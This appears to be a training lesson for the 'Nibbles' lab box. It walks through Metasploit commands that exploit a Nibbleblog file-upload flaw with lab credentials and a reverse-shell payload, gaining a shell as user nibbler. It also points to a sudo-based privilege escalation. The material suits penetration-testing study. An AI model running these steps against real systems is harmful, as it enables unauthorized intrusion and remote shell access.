# Nibbles: Alternate User Method - Metasploit

## Overview

The same Nibbleblog file-upload vulnerability exploited manually also has an existing Metasploit module. This lesson walks through the automated alternative — more straightforward than the manual method, but still worth knowing both approaches, since not every target or engagement allows Metasploit.

## Learning Objectives

- Search for and select an appropriate Metasploit module
- Configure module-specific options beyond the usual RHOSTS/LHOST
- Choose a payload type appropriate to the target shell requirements
- Compare the outcome of the automated method against the manual exploitation path

## Finding the Module

```bash
msfconsole
search nibbleblog
```

This surfaces `exploit/multi/http/nibbleblog_file_upload` — a module built specifically for the same Nibbleblog plugin upload vulnerability exploited manually in the foothold lesson.

```bash
use exploit/multi/http/nibbleblog_file_upload
```

## Configuring Module Options

```bash
set rhosts <ip>
set lhost <attacker tun0 ip>
show options
```

Unlike a simple network exploit, this web-app module requires additional options beyond RHOSTS/LHOST — it needs valid credentials and the application's base path:

```bash
set username admin
set password nibbles
set targeturi nibbleblog
```

`USERNAME` and `PASSWORD` are the same admin credentials recovered manually; `TARGETURI` tells the module where the Nibbleblog installation lives relative to the web root.

## Choosing a Payload

The module's default payload was `php/meterpreter/reverse_tcp`. For this exercise, a plain command shell was used instead:

```bash
set payload generic/shell_reverse_tcp
```

## Running the Exploit

```bash
exploit
```

This opened a command shell session as `nibbler` — the same user obtained through the manual upload method. A quick `id` confirms the identical starting point.

## Comparing Manual vs. Metasploit

From this point, the exact same privilege escalation path covered in the previous lesson (the world-writable `monitor.sh` script and its `NOPASSWD` sudo rule) applies regardless of which method produced the initial foothold — the vulnerability exploited is identical, only the delivery mechanism differs.

As a follow-up exercise, it's worth searching for other exploitation methods against the same web app, since this is an older box — outdated kernel exploits or other privilege escalation avenues may exist beyond the one demonstrated here.

## Skills Practiced

- Metasploit module search and selection
- Configuring web-application-specific module options (credentials, target URI)
- Payload selection (Meterpreter vs. plain shell)
- Cross-validating a manual exploit against its automated Metasploit equivalent

## Key Takeaways

- Metasploit modules for web applications often need more configuration than a typical network service exploit — credentials and a base path are common additions to RHOSTS/LHOST.
- Getting the same resulting user (`nibbler`) via two completely different methods confirms the underlying vulnerability is understood, not just the tool that happened to exploit it.
- Knowing both the manual and automated path matters — some engagements restrict or disallow Metasploit, and manual exploitation also builds a deeper understanding of why the automated module works.
